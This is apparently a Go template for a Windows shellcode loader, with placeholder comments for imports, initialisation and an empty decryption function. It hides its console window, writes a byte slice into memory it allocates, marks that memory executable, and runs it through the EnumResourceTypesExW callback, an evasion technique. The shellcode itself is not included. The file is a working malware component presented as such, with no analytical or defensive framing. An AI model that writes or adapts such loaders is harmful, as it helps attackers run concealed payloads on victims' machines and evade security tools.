package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	//__import__
)


func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {

	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	LoadLibraryW := kernel32.NewProc("LoadLibraryW")
	EnumResourceTypesExW := kernel32.NewProc("EnumResourceTypesExW")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
	VirtualProtect := kernel32.NewProc("VirtualProtect")

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000|0x2000, 0x04)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
	oldProtect := 0x04
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x20, uintptr(unsafe.Pointer(&oldProtect)))
	p1, _ := syscall.UTF16PtrFromString("Kernel32.dll")
	dll1, _, _ := LoadLibraryW.Call(uintptr(unsafe.Pointer(p1)))
	EnumResourceTypesExW.Call(dll1, addr, 0, 0x0008, 0)
}
